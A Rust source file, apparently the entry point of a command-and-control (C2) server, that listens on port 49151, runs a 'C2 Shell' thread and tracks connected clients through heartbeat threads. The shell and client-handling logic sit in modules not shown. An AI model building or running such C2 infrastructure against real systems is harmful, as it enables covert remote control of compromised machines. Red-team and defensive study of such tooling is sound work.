use std::io::Write;
use std::net::TcpListener;
use std::{io, thread};
use crate::handler::utils::{handle_client,
                            server};
use crate::config::ClientManager;
use crate::handler::heartbeats::{listen_for_heartbeats, monitor_heartbeats};
mod handler;
mod config;

/// Entry point for the server application.
///
/// Initializes a TCP server that listens on port 49151, manages client connections,
/// and spawns threads for various tasks including handling client data, listening for
/// heartbeats, and monitoring client connections.
fn main() {
    let listener = TcpListener::bind("0.0.0.0:49151").unwrap();
    // println!("[I] Server listening on port 49151");
    io::stdout().flush().unwrap();

    let client_manager: ClientManager = ClientManager::new();

    // Thread for the C2 Shell
    let server_client_manager_clone = client_manager.clone();
    thread::spawn(|| server(server_client_manager_clone));

    // Thread to remove Clients not connected
    let heartbeat_client_manager_clone = client_manager.clone();
    thread::spawn(move || {
        // println!("[I] Monitor heartbeats");
        monitor_heartbeats(heartbeat_client_manager_clone);
    });

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                // Thread that handle the communication with this client
                let client_manager_clone = client_manager.clone();
                let ip = stream.peer_addr().unwrap().to_string();
                thread::spawn(move || {
                    handle_client(stream, client_manager_clone);
                });

                // Thread that listenes for the heartbeats for this client
                let listen_heartbeats_client_manager_clone = client_manager.clone();
                thread::spawn(move || {
                    listen_for_heartbeats(listen_heartbeats_client_manager_clone, ip)
                });
            },
            Err(e) => {
                println!("[E] Error while listening for new connections: {}", e);
            }
        }
    }
}

